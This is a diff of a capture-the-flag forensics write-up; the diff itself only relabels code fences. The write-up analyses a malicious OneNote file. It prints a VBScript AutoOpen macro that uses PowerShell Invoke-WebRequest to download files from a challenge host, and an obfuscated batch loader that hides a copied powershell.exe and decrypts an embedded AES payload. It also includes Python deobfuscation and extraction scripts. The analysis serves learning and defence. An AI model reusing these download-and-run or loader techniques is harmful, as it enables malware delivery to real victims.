@@ -13,7 +13,7 @@ Tags: _forensics_
 For this challenge no files are provided, only the link in the hint. To make the site reachable the domain needs to be added to `/etc/hosts`. After doing so the file can be downloaded. Running `file` on the file only leads `relicmaps.one: data`.
 
 Next up, `binwalk`, this indeed leads a few files.
-```
+```bash
 $ binwalk --dd ".*" relicmaps.one
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
@@ -29,7 +29,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 
 Most notably the HTML document. It has some malicious VBScript in it that seems to download more files.
 
-```
+```VB
 // snip...
 Sub AutoOpen()
     ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/uploads/soft/topsecret-maps.one -Out>
@@ -40,7 +40,7 @@ End Sub
 
  Fetching `topsecret-maps.one` seems like a dead end, but `windows.bat` is interesting:
 
-```
+```bash
 @echo off
 set "eFlP=set "
 %eFlP%"ualBOGvshk=ws"
@@ -60,7 +60,7 @@ cls
 
 This obviously is obfuscated code, to make things more clear we need to deobfuscate the whole thing. Luckily the obfuscation can be easily reverted by replacing the random string constants with what they are set to. While doing this by hand is cumbersome we can quickly write a [`script`](deobfuscate.py).
 
-```
+```python
 with open("data.txt", "r") as file:
     lines = file.readlines()
 
@@ -110,7 +110,7 @@ cIqyYRJWbQ=we
 
 After cleaning the result up a bit, we end up with an readable version of the script:
 
-```
+```PowerShell
 copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y %~0.exe
 
 cls
@@ -149,7 +149,7 @@ $PtfdQ.Invoke($null, (, [string[]] ('%*')))
 
 While some obfuscation remains (reversed function names) the script is well understandable. It basically copies powershell to the local folder and renames the exe to match the scripts name.
 
-```
+```PowerSHell
 copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y %~0.exe
 
 cls
@@ -158,7 +158,7 @@ cd %~dp0
 
 After that the script reads itself and scans for a line that starts with ':: '. This is the encrypted payload.
 
-```
+```PowerSHell
 %~nx0.exe -noprofile -windowstyle hidden -ep bypass -command $eIfqq = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('%~f0').Split([Environment]::NewLine)
 
 foreach ($YiLGW in $eIfqq) { 
@@ -173,7 +173,7 @@ Then the payload gets decrypted and decompressed. The `key` and `iv` for AES dec
 
 If PowerShell is at hand we can extract the payload with the script (after removing the invocation of the payload of course). Otherwise a small python script [`can do the same thing`](extract.py):
 
-```
+```python
 import base64
 from Crypto.Cipher import AES
 import gzip
@@ -194,13 +194,13 @@ with open("payload.decrypted", "wb") as out:
 ```
 
 Checking the extracted payload with `file` and indeed it's a .NET executable.
-```
+```bash
 $ file payload
 payload: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
 ```
 
 This can quickly be decompiled with ILSpy.
-```
+```C#
 private static void Main(string[] args)
 {
 	IPAddress iPAddress = Dns.GetHostAddresses(Dns.GetHostName()).FirstOrDefault((IPAddress ip) => ip.AddressFamily == AddressFamily.InterNetwork);
